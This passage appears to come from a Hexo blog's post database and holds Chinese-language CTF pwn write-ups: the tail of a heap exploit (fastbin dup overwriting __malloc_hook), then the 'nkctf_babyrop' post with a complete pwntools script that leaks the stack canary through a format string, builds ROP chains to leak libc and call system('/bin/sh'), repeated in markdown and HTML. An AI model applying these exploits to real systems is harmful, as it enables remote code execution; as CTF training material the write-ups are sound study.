class=\"comment\">#15</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#fastbin dup</span></span><br><span class=\"line\">dele(<span class=\"number\">5</span>)</span><br><span class=\"line\">dele(<span class=\"number\">14</span>)</span><br><span class=\"line\">dele(<span class=\"number\">0xc</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">6</span>)</span><br><span class=\"line\">dele(<span class=\"number\">15</span>)</span><br><span class=\"line\">dele(<span class=\"number\">0xd</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,p64(<span class=\"number\">0x41</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,p64(lbase+<span class=\"number\">0x3c4b20</span>+<span class=\"number\">8</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,p64(lbase+<span class=\"number\">0x3c4b20</span>+<span class=\"number\">8</span>+<span class=\"number\">0x20</span>)+<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x10</span>+p64(<span class=\"number\">0x41</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x20</span>+p64(lbase+libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]-<span class=\"number\">0x18</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,p64(lbase+<span class=\"number\">0xf03a4</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;Choice:&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;size:&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"built_in\">str</span>(<span class=\"number\">0x18</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"nkctf_babyrop","date":"2023-03-26T14:05:12.000Z","_content":"\nnkctf的babyrop，思路和西湖论剑2022的baby calc一样，不过简单了不少。\n\n都是通过覆盖rbp低位为`\\x00`栈迁移到前面的rop链进行ROP，不过这里有canary，需要先通过格式化字符串泄露canary。\n\n<!-- more -->\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NK/baby_rop/nkctf_babyrop'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n开了NX和Canary\n\n```py\nfrom pwn import *\nfrom LibcSearcher import *\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='nkctf_babyrop'\nelf=ELF('./'+filename)\n# libc=ELF(\"/usr/lib/x86_64-linux-gnu/libc-2.31.so\")\n# p=process(\"./\"+filename)  \np = remote(\"node4.buuoj.cn\",)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\npop_rdi_ret=0x0000000000401413\npop_rsi_r15_ret=0x0000000000401411\nstart_addr=0x4010f0\nbss_addr=0x404500\nleave_ret=0x40138A\nret_addr=0x40138B\nmy_read=0x40123B\n\nputs_plt=elf.plt['puts']\nputs_got=elf.got['puts']\nread_plt=elf.plt['read']\n\npayload=\"%41$p\"\nru(\"your name: \")\nsl(payload)\nru(\"Hello, 0x\")\ncanary=int(r(16),16)\nleak(\"canary:\",hex(canary))\n\npayload=p64(ret_addr)*20\npayload+=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)\npayload+=p64(pop_rdi_ret)+p64(bss_addr)\npayload+=p64(pop_rsi_r15_ret)+p64(0x9)+p64(0xdeadbeef)\npayload+=p64(my_read)\npayload+=p64(start_addr)\npayload=payload.ljust(0x100 - 0x8,b'a')+p64(canary)\n\nru(\"the NKCTF: \")\ns(payload)\n\nputs_addr = u64(ru(\"\\x7f\")[-6:].ljust(8,b'\\x00'))\n\nlibc=LibcSearcher('puts', puts_addr)\nlibc_base=puts_addr-libc.dump('puts')\nsystem_addr=libc_base+libc.dump('system')\n\nleak(\"puts_addr:\",hex(puts_addr))\nleak(\"system_addr:\",hex(system_addr))\nleak(\"libc_base:\",hex(libc_base))\n\nsl(\"/bin/sh\")\n\npayload=\"%41$p\"\nru(\"your name: \")\nsl(payload)\nru(\"Hello, 0x\")\ncanary=int(r(16),16)\nleak(\"canary:\",hex(canary))\n\npayload=p64(ret_addr)*20\npayload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(system_addr)\npayload=payload.ljust(0x100-0x8,b'a')+p64(canary)\n\nru(\"the NKCTF: \")\ns(payload)\n\n# debug()\n\nitr()\n```\n\n","source":"_posts/nkctf_babyrop.md","raw":"---\ntitle: nkctf_babyrop\ndate: 2023-03-26 22:05:12\ncategories: \n- pwn_wp\ntags: \n- pwn\n- ROP\n- format\n\n---\n\nnkctf的babyrop，思路和西湖论剑2022的baby calc一样，不过简单了不少。\n\n都是通过覆盖rbp低位为`\\x00`栈迁移到前面的rop链进行ROP，不过这里有canary，需要先通过格式化字符串泄露canary。\n\n<!-- more -->\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NK/baby_rop/nkctf_babyrop'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n开了NX和Canary\n\n```py\nfrom pwn import *\nfrom LibcSearcher import *\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='nkctf_babyrop'\nelf=ELF('./'+filename)\n# libc=ELF(\"/usr/lib/x86_64-linux-gnu/libc-2.31.so\")\n# p=process(\"./\"+filename)  \np = remote(\"node4.buuoj.cn\",)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\npop_rdi_ret=0x0000000000401413\npop_rsi_r15_ret=0x0000000000401411\nstart_addr=0x4010f0\nbss_addr=0x404500\nleave_ret=0x40138A\nret_addr=0x40138B\nmy_read=0x40123B\n\nputs_plt=elf.plt['puts']\nputs_got=elf.got['puts']\nread_plt=elf.plt['read']\n\npayload=\"%41$p\"\nru(\"your name: \")\nsl(payload)\nru(\"Hello, 0x\")\ncanary=int(r(16),16)\nleak(\"canary:\",hex(canary))\n\npayload=p64(ret_addr)*20\npayload+=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)\npayload+=p64(pop_rdi_ret)+p64(bss_addr)\npayload+=p64(pop_rsi_r15_ret)+p64(0x9)+p64(0xdeadbeef)\npayload+=p64(my_read)\npayload+=p64(start_addr)\npayload=payload.ljust(0x100 - 0x8,b'a')+p64(canary)\n\nru(\"the NKCTF: \")\ns(payload)\n\nputs_addr = u64(ru(\"\\x7f\")[-6:].ljust(8,b'\\x00'))\n\nlibc=LibcSearcher('puts', puts_addr)\nlibc_base=puts_addr-libc.dump('puts')\nsystem_addr=libc_base+libc.dump('system')\n\nleak(\"puts_addr:\",hex(puts_addr))\nleak(\"system_addr:\",hex(system_addr))\nleak(\"libc_base:\",hex(libc_base))\n\nsl(\"/bin/sh\")\n\npayload=\"%41$p\"\nru(\"your name: \")\nsl(payload)\nru(\"Hello, 0x\")\ncanary=int(r(16),16)\nleak(\"canary:\",hex(canary))\n\npayload=p64(ret_addr)*20\npayload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(system_addr)\npayload=payload.ljust(0x100-0x8,b'a')+p64(canary)\n\nru(\"the NKCTF: \")\ns(payload)\n\n# debug()\n\nitr()\n```\n\n","slug":"nkctf_babyrop","published":1,"updated":"2023-03-30T07:52:08.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag8004n5oud7q9cfl0p","content":"<p>nkctf的babyrop，思路和西湖论剑2022的baby calc一样，不过简单了不少。</p>\n<p>都是通过覆盖rbp低位为<code>\\x00</code>栈迁移到前面的rop链进行ROP，不过这里有canary，需要先通过格式化字符串泄露canary。</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NK/baby_rop/nkctf_babyrop&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>开了NX和Canary</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;nkctf_babyrop&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&quot;./&quot;+filename)  </span></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret=<span class=\"number\">0x0000000000401413</span></span><br><span class=\"line\">pop_rsi_r15_ret=<span class=\"number\">0x0000000000401411</span></span><br><span class=\"line\">start_addr=<span class=\"number\">0x4010f0</span></span><br><span class=\"line\">bss_addr=<span class=\"number\">0x404500</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x40138A</span></span><br><span class=\"line\">ret_addr=<span class=\"number\">0x40138B</span></span><br><span class=\"line\">my_read=<span class=\"number\">0x40123B</span></span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">read_plt=elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&quot;%41$p&quot;</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;your name: &quot;</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Hello, 0x&quot;</span>)</span><br><span class=\"line\">canary=<span class=\"built_in\">int</span>(r(<span class=\"number\">16</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">leak(<span class=\"string\">&quot;canary:&quot;</span>,<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(ret_addr)*<span class=\"number\">20</span></span><br><span class=\"line\">payload+=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)</span><br><span class=\"line\">payload+=p64(pop_rdi_ret)+p64(bss_addr)</span><br><span class=\"line\">payload+=p64(pop_rsi_r15_ret)+p64(<span class=\"number\">0x9</span>)+p64(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">payload+=p64(my_read)</span><br><span class=\"line\">payload+=p64(start_addr)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0x100</span> - <span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p64(canary)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;the NKCTF: &quot;</span>)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr = u64(ru(<span class=\"string\">&quot;\\x7f&quot;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class=\"line\">libc_base=puts_addr-libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">system_addr=libc_base+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&quot;puts_addr:&quot;</span>,<span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;system_addr:&quot;</span>,<span class=\"built_in\">hex</span>(system_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libc_base:&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">sl(<span class=\"string\">&quot;/bin/sh&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&quot;%41$p&quot;</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;your name: &quot;</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Hello, 0x&quot;</span>)</span><br><span class=\"line\">canary=<span class=\"built_in\">int</span>(r(<span class=\"number\">16</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">leak(<span class=\"string\">&quot;canary:&quot;</span>,<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(ret_addr)*<span class=\"number\">20</span></span><br><span class=\"line\">payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(system_addr)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0x100</span>-<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p64(canary)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;the NKCTF: &quot;</span>)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>nkctf的babyrop，思路和西湖论剑2022的baby calc一样，不过简单了不少。</p>\n<p>都是通过覆盖rbp低位为<code>\\x00</code>栈迁移到前面的rop链进行ROP，不过这里有canary，需要先通过格式化字符串泄露canary。</p>","more":"<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NK/baby_rop/nkctf_babyrop&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>开了NX和Canary</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;nkctf_babyrop&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&quot;./&quot;+filename)  </span></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret=<span class=\"number\">0x0000000000401413</span></span><br><span class=\"line\">pop_rsi_r15_ret=<span class=\"number\">0x0000000000401411</span></span><br><span class=\"line\">start_addr=<span class=\"number\">0x4010f0</span></span><br><span class=\"line\">bss_addr=<span class=\"number\">0x404500</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x40138A</span></span><br><span class=\"line\">ret_addr=<span class=\"number\">0x40138B</span></span><br><span class=\"line\">my_read=<span class=\"number\">0x40123B</span></span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">read_plt=elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&quot;%41$p&quot;</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;your name: &quot;</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Hello, 0x&quot;</span>)</span><br><span class=\"line\">canary=<span class=\"built_in\">int</span>(r(<span class=\"number\">16</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">leak(<span class=\"string\">&quot;canary:&quot;</span>,<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(ret_addr)*<span class=\"number\">20</span></span><br><span class=\"line\">payload+=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)</span><br><span class=\"line\">payload+=p64(pop_rdi_ret)+p64(bss_addr)</span><br><span class=\"line\">payload+=p64(pop_rsi_r15_ret)+p64(<span class=\"number\">0x9</span>)+p64(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">payload+=p64(my_read)</span><br><span class=\"line\">payload+=p64(start_addr)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0x100</span> - <span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p64(canary)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;the NKCTF: &quot;</span>)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr = u64(ru(<span class=\"string\">&quot;\\x7f&quot;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class=\"line\">libc_base=puts_addr-libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">system_addr=libc_base+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&quot;puts_addr:&quot;</span>,<span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;system_addr:&quot;</span>,<span class=\"built_in\">hex</span>(system_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libc_base:&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">sl(<span class=\"string\">&quot;/bin/sh&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&quot;%41$p&quot;</span></span><br><span class=\"line\">ru(<span class=\"string\">&quot;your name: &quot;</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Hello, 0x&quot;</span>)</span><br><span class=\"line\">canary=<span class=\"built_in\">int</span>(r(<span class=\"number\">16</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">leak(<span class=\"string\">&quot;canary:&quot;</span>,<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(ret_addr)*<span class=\"number\">20</span></span><br><span class=\"line\">payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(system_addr)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0x100</span>-<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p64(canary)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;the NKCTF: &quot;</span>)</span><br><span 